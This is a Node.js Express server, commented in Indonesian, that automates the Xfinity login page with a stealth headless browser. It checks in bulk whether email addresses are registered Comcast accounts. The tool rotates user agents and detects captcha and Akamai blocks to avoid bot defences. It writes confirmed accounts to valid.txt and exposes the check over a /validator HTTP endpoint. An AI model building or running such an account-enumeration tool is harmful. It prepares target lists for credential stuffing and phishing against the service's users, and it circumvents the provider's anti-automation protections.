'use strict';

const express = require('express');
const expressStatusMonitor = require('express-status-monitor');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const fs = require('fs');
const path = require('path');
const UserAgent = require('user-agents');

puppeteer.use(StealthPlugin());

// =====================================================================
// SAFETY NET: proses TIDAK akan mati walau ada error tak terduga.
// (Penyebab utama "endpoint hidup lalu mati" = unhandled rejection
//  yang membuat Node mematikan proses. Dengan handler ini server tetap
//  hidup dan error dicatat ke log.)
// =====================================================================
process.on('unhandledRejection', (err) => {
  console.error('[unhandledRejection]', err && err.stack ? err.stack : String(err));
});
process.on('uncaughtException', (err) => {
  console.error('[uncaughtException]', err && err.stack ? err.stack : String(err));
});

const colors = {
  reset: '\x1b[0m',
  green: '\x1b[32m',
  red: '\x1b[31m',
  yellow: '\x1b[33m',
};

const LOGIN_URL = process.env.LOGIN_URL || 'https://login.xfinity.com/login';
const OUT_DIR = process.env.OUT_DIR || __dirname;

// ---------------------------------------------------------------------
// Konfigurasi batas waktu & kapasitas (semua bisa di-override via env)
// ---------------------------------------------------------------------
const MAX_CONCURRENT = parseInt(process.env.MAX_CONCURRENT || '2', 10);      // Chrome paralel
const MAX_QUEUE = parseInt(process.env.MAX_QUEUE || '100', 10);              // batas antrean (anti antrian tanpa batas)
const QUEUE_TIMEOUT_MS = parseInt(process.env.QUEUE_TIMEOUT_MS || '180000', 10); // antrian > 3 menit => 503, bukan gantung
const CHECK_TIMEOUT_MS = parseInt(process.env.CHECK_TIMEOUT_MS || '120000', 10); // watchdog per pengecekan
const NAV_TIMEOUT_MS = parseInt(process.env.NAV_TIMEOUT_MS || '45000', 10);      // timeout goto

// ---------------------------------------------------------------------
// Helper kecil
// ---------------------------------------------------------------------
function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function getRandomUserAgent() {
  try {
    return new UserAgent({ deviceCategory: 'mobile' }).toString();
  } catch {
    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
  }
}

// Watchdog: bungkus promise dengan timeout agar job tidak menggantung
// dan menyandera slot konkurensi selamanya.
function withTimeout(promise, ms, label) {
  let timer;
  const timeout = new Promise((_, reject) => {
    timer = setTimeout(() => reject(new Error(`watchdog timeout: ${label} (${ms}ms)`)), ms);
  });
  return Promise.race([promise, timeout]).finally(() => clearTimeout(timer));
}

// Cari binary Chrome: CHROME_PATH -> google-chrome -> chromium -> bawaan puppeteer
function chromePath() {
  if (process.env.CHROME_PATH && fs.existsSync(process.env.CHROME_PATH)) {
    return process.env.CHROME_PATH;
  }
  for (const p of [
    '/usr/bin/google-chrome',
    '/usr/bin/google-chrome-stable',
    '/usr/bin/chromium',
    '/usr/bin/chromium-browser',
  ]) {
    if (fs.existsSync(p)) return p;
  }
  return undefined; // biarkan puppeteer memakai Chrome bawaan-nya
}

async function launchBrowser() {
  return puppeteer.launch({
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-gpu',
      '--disable-dev-shm-usage',
      '--disable-software-rasterizer',
      '--no-zygote',
      '--disable-extensions',
      '--disable-background-timer-throttling',
      '--disable-background-networking',
      '--disable-default-apps',
      '--disable-translate',
      '--no-first-run',
    ],
    executablePath: chromePath(),
    slowMo: 40,
    protocolTimeout: 60000, // CDP wedged => error jelas, bukan gantung diam-diam
  });
}

// =====================================================================
// FIX #1: BROWSER DIPAKAI ULANG (shared browser + context terisolasi).
// Versi lama meluncurkan satu Chrome BARU per request -> RAM VPS cepat
// habis -> proses di-OOM-kill -> "endpoint hidup lalu mati".
// Sekarang: satu Chrome long-lived; tiap pengecekan dapat context/page
// terisolasi. Jika Chrome mati/wedged, otomatis diluncurkan ulang.
// =====================================================================
let sharedBrowser = null;
let launchPromise = null;

function invalidateSharedBrowser() {
  const b = sharedBrowser;
  sharedBrowser = null;
  launchPromise = null;
  if (b) {
    try {
      const proc = b.process ? b.process() : null;
      if (proc && proc.exitCode === null) proc.kill('SIGKILL');
    } catch {}
    b.close().catch(() => {});
  }
}

async function getSharedBrowser() {
  if (sharedBrowser) {
    let alive = false;
    try {
      const proc = sharedBrowser.process ? sharedBrowser.process() : null;
      alive = !!proc && proc.exitCode === null;
    } catch {
      alive = false;
    }
    if (alive) return sharedBrowser;
    invalidateSharedBrowser();
  }
  if (!launchPromise) {
    launchPromise = launchBrowser().then(
      (b) => {
        sharedBrowser = b;
        return b;
      },
      (e) => {
        launchPromise = null;
        throw e;
      }
    );
    // reset penanda setelah semua pemanggil mengambil hasilnya
    launchPromise.then(() => {}, () => {}).then(() => {
      if (launchPromise && launchPromise.isFulfilled) launchPromise = null;
    }).catch(() => {});
  }
  return launchPromise;
}

// Context terisolasi per pengecekan (nama API beda antar versi puppeteer)
async function newIsolatedPage(browser) {
  try {
    if (typeof browser.createBrowserContext === 'function') {
      const ctx = await browser.createBrowserContext();
      return { page: await ctx.newPage(), ctx };
    }
    if (typeof browser.createIncognitoBrowserContext === 'function') {
      const ctx = await browser.createIncognitoBrowserContext();
      return { page: await ctx.newPage(), ctx };
    }
  } catch {}
  return { page: await browser.newPage(), ctx: null };
}

function isBrowserDeadError(err) {
  return /Target closed|Session closed|Browser closed|Protocol error|Connection closed|WebSocket|Navigation failed/i.test(
    String((err && err.message) || err)
  );
}

async function pageText(page) {
  try {
    const body = await page.$('body');
    if (!body) return '';
    const t = await body.evaluate((el) => el.innerText || el.textContent || '');
    return (t || '').trim();
  } catch {
    return '';
  }
}

function matchAny(text, patterns) {
  const lower = (text || '').toLowerCase();
  for (const p of patterns) {
    if (lower.includes(p.toLowerCase())) return p;
  }
  return null;
}

// Tunggu elemen pertama yang muncul dari daftar selector (fallback,
// bukan lagi hardcoded #user / #sign_in yang gampang timeout).
async function waitForFirstSelector(page, selectors, timeoutMs) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    for (const sel of selectors) {
      const el = await page.$(sel).catch(() => null);
      if (el) return { el, sel };
    }
    await delay(300);
  }
  return null;
}

// ---------------------------------------------------------------------
// FIX #2: polling hasil setelah submit (pengganti waitForNavigation).
// ---------------------------------------------------------------------
async function waitOutcome(page, timeoutMs) {
  const passwordSelectors = ['#passwd', 'input[name="password"]', 'input[type="password"]'];
  const failedPatterns = [
    "we don't recognize that xfinity id",
    'the xfinity id you entered was incorrect',
    'no account found',
    "doesn't match our records",
  ];
  const forbiddenPatterns = [
    'access denied',
    'akamai',
    "you don't have permission to access",
    'captcha',
    'unusual traffic',
    'your account has been suspended',
    'too many requests',
  ];
  const errorPatterns = ['something went wrong', 'temporarily unavailable', 'technical difficulties'];

  const deadline = Date.now() + timeoutMs;
  let snippet = '';

  while (Date.now() < deadline) {
    for (const sel of passwordSelectors) {
      const pw = await page.$(sel).catch(() => null);
      if (pw) {
        return { status: 'SUCCESS', detail: 'password step reached' };
      }
    }

    const txt = await pageText(page);
    snippet = txt;

    const f = matchAny(txt, forbiddenPatterns);
    if (f) return { status: 'FORBIDDEN', detail: f };

    const nf = matchAny(txt, failedPatterns);
    if (nf) return { status: 'FAILED', detail: nf };

    const er = matchAny(txt, errorPatterns);
    if (er) return { status: 'ERROR', detail: er };

    // "Enter your password" = akun terdaftar (fallback teks)
    if ((txt || '').toLowerCase().includes('enter your password')) {
      return { status: 'SUCCESS', detail: 'password prompt text' };
    }

    await delay(500);
  }

  return { status: 'UNKNOWN', detail: `no decisive text: ${snippet.slice(0, 160)}` };
}

function appendResult(status, email) {
  const file = {
    SUCCESS: 'valid.txt',
    FAILED: 'bad.txt',
    FORBIDDEN: 'forbidden.txt',
    ERROR: 'bad.txt',
    UNKNOWN: 'unknown.txt',
  }[status];
  if (file) fs.appendFileSync(path.join(OUT_DIR, file), `${email}\n`);
}

// ---------------------------------------------------------------------
// Cek satu email (satu attempt)
// ---------------------------------------------------------------------
async function checkEmailOnce(email) {
  const browser = await getSharedBrowser();
  let page = null;
  let ctx = null;

  try {
    ({ page, ctx } = await newIsolatedPage(browser));

    await page.setUserAgent(getRandomUserAgent());
    await page.setViewport({ width: 1366, height: 768 });

    // goto dengan 1x retry jika nav error/transien
    try {
      await withTimeout(
        page.goto(LOGIN_URL, { waitUntil: 'domcontentloaded', timeout: NAV_TIMEOUT_MS }),
        NAV_TIMEOUT_MS + 5000,
        'goto'
      );
    } catch (e) {
      if (isBrowserDeadError(e)) throw e; // browser mati -> relaunch di level atas
      await delay(2000);
      await withTimeout(
        page.goto(LOGIN_URL, { waitUntil: 'domcontentloaded', timeout: NAV_TIMEOUT_MS }),
        NAV_TIMEOUT_MS + 5000,
        'goto-retry'
      );
    }

    const userField = await waitForFirstSelector(
      page,
      ['#user', 'input[name="user"]', 'input[type="email"]', 'input[name="email"]'],
      20000
    );
    if (!userField) throw new Error('email input not found on page');

    await userField.el.type(email, { delay: 30 });
    await delay(1500);

    const submitBtn = await waitForFirstSelector(
      page,
      ['#sign_in', 'button[type="submit"]', 'input[type="submit"]'],
      10000
    );
    if (!submitBtn) throw new Error('submit button not found on page');
    await submitBtn.el.click();

    const verdict = await waitOutcome(page, 45000);
    const msg =
      verdict.status === 'SUCCESS' ? colors.green : verdict.status === 'FAILED' ? colors.red : colors.yellow;
    console.log(`${msg}[${verdict.status}] ${email} (${verdict.detail})${colors.reset}`);

    appendResult(verdict.status, email);
    return { email, status: verdict.status, detail: verdict.detail };
  } finally {
    // tutup page/context dengan timeout pendek supaya cleanup tidak ikut menggantung
    try {
      if (page) await withTimeout(page.close(), 5000, 'page.close').catch(() => {});
    } catch {}
    try {
      if (ctx) await withTimeout(ctx.close(), 5000, 'ctx.close').catch(() => {});
    } catch {}
  }
}

// Cek satu email: retry sekali jika Chrome-nya mati/wedged
async function checkEmail(email) {
  let lastErr = null;
  for (let attempt = 1; attempt <= 2; attempt++) {
    try {
      return await checkEmailOnce(email);
    } catch (e) {
      lastErr = e;
      if (isBrowserDeadError(e)) {
        console.log(`[browser-restart] attempt ${attempt} gagal: ${String(e.message).slice(0, 120)}`);
        invalidateSharedBrowser(); // Chrome berikutnya diluncurkan ulang
        await delay(1000);
        continue;
      }
      break;
    }
  }
  throw lastErr;
}

// ---------------------------------------------------------------------
// FIX #3: Pembatas konkurensi yang TIDAK BOCAK.
// - Antrean dibatasi (MAX_QUEUE) -> overload dijawab 503, bukan antrian
//   tanpa batas yang memakan memori.
// - Permintaan yang menunggu terlalu lama di antrean dijawab 503
//   (QUEUE_TIMEOUT_MS), bukan gantung selamanya.
// - Slot selalu dilepas lewat finally + flag released (anti double-release
//   / anti leak saat error di tengah jalan).
// ---------------------------------------------------------------------
const MAX_QUEUE_N = Number.isFinite(MAX_QUEUE) ? MAX_QUEUE : 100;
let active = 0;
const waitQueue = [];

function acquire() {
  if (active < MAX_CONCURRENT) {
    active += 1;
    return Promise.resolve();
  }
  if (waitQueue.length >= MAX_QUEUE_N) {
    const err = new Error('server busy: antrean penuh, coba lagi nanti');
    err.statusCode = 503;
    return Promise.reject(err);
  }
  return new Promise((resolve, reject) => {
    const entry = {
      done: false,
      settle: null,
    };
    entry.settle = () => {
      if (entry.done) return;
      entry.done = true;
      clearTimeout(entry.timer);
      const i = waitQueue.indexOf(entry);
      if (i !== -1) waitQueue.splice(i, 1);
    };
    entry.timer = setTimeout(() => {
      entry.settle();
      const err = new Error(`queue timeout: menunggu > ${QUEUE_TIMEOUT_MS}ms`);
      err.statusCode = 503;
      reject(err);
    }, QUEUE_TIMEOUT_MS);
    entry.resolveWrapped = () => {
      if (entry.done) return;
      entry.settle();
      active += 1;
      resolve();
    };
    waitQueue.push(entry);
  });
}

function release() {
  active = Math.max(0, active - 1);
  const next = waitQueue.shift();
  if (next) next.resolveWrapped();
}

// Kirim response dengan aman (klien bisa saja sudah disconnect)
function safeJson(res, code, obj) {
  try {
    if (!res.headersSent && !res.destroyed) return res.status(code).json(obj);
  } catch {}
}

// ---------------------------------------------------------------------
// Express
// ---------------------------------------------------------------------
const app = express();
const PORT = parseInt(process.env.PORT || '3000', 10);

// Dashboard monitoring di /monitor (jangan bentrok dengan /status health-check)
app.use(expressStatusMonitor({ path: '/monitor' }));

app.get('/status', (req, res) => {
  let browserAlive = false;
  try {
    const proc = sharedBrowser && sharedBrowser.process ? sharedBrowser.process() : null;
    browserAlive = !!proc && proc.exitCode === null;
  } catch {}
  res.json({
    ok: true,
    uptime: process.uptime(),
    activeChecks: active,
    queued: waitQueue.length,
    browserAlive,
    limits: { MAX_CONCURRENT, MAX_QUEUE: MAX_QUEUE_N, CHECK_TIMEOUT_MS },
  });
});

app.get('/validator', async (req, res) => {
  const email = (req.query.email || '').trim();
  if (!email) {
    return res.status(400).json({ error: 'Email must be provided as a query parameter' });
  }
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) || email.length > 254) {
    return res.status(400).json({ error: 'Invalid email format', email });
  }

  // FIX: deteksi klien disconnect -> hasil tetap diproses & dicatat,
  // tapi tidak mencoba mengirim response ke klien yang sudah pergi.
  let clientGone = false;
  res.on('close', () => {
    if (!res.writableEnded) clientGone = true;
  });

  let released = false;
  const releaseSlot = () => {
    if (!released) {
      released = true;
      release();
    }
  };

  try {
    await acquire();
  } catch (e) {
    return res.status(e.statusCode || 503).json({ email, status: 'BUSY', message: e.message });
  }

  try {
    const result = await withTimeout(checkEmail(email), CHECK_TIMEOUT_MS, `checkEmail ${email}`);
    if (clientGone || res.destroyed) {
      console.log(`[client-gone] ${email}: hasil tetap dicatat, response dilewati`);
      return;
    }
    safeJson(res, 200, result);
  } catch (e) {
    const msg = String((e && e.message) || e).slice(0, 200);
    console.log(`${colors.yellow}[ERROR] ${email}: ${msg}${colors.reset}`);
    appendResult('ERROR', email);
    if (clientGone || res.destroyed) return;
    safeJson(res, 500, { email, status: 'ERROR', message: msg });
  } finally {
    releaseSlot(); // slot SELALU dikembalikan walau request gagal/klien pergi
  }
});

// Error middleware terakhir (jaga-jaga)
app.use((err, req, res, next) => {
  console.error('[express-error]', err);
  if (res.headersSent) return next(err);
  res.status(500).json({ error: 'internal error', message: String((err && err.message) || err).slice(0, 200) });
});

// FIX #5: kalau listen gagal (mis. EADDRINUSE / port dipakai), proses
// keluar dengan jelas — TIDAK dibiarkan hidup tanpa server oleh
// safety-net uncaughtException (zombie process).
const server = app.listen(PORT);
server.on('error', (err) => {
  console.error(`[startup-error] gagal listen di port ${PORT}:`, err.message);
  process.exit(1);
});
server.on('listening', () => {
  console.log(`Server is running on http://0.0.0.0:${PORT}`);
  console.log(`  GET /validator?email=user@comcast.net  -> cek email`);
  console.log(`  GET /status                            -> health check`);
  console.log(`  GET /monitor                           -> dashboard`);
  console.log(`  Chrome: ${chromePath() || '(bawaan puppeteer)'} | concurrency: ${MAX_CONCURRENT}, queue: ${MAX_QUEUE_N}`);
});

// ---------------------------------------------------------------------
// FIX #4: graceful shutdown — Chrome & server ditutup dengan rapi saat
// proses di-stop (SIGTERM/SIGINT), bukan ditinggalkan zombie.
// ---------------------------------------------------------------------
let shuttingDown = false;
async function shutdown(signal) {
  if (shuttingDown) return;
  shuttingDown = true;
  console.log(`\n[shutdown] ${signal} diterima, menutup server...`);
  try {
    server.close(() => process.exit(0));
    // beri waktu request in-flight selesai sebentar
    await delay(3000);
    if (sharedBrowser) {
      try {
        await withTimeout(sharedBrowser.close(), 5000, 'browser.close');
      } catch {}
    }
    process.exit(0);
  } catch {
    process.exit(0);
  }
}
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));
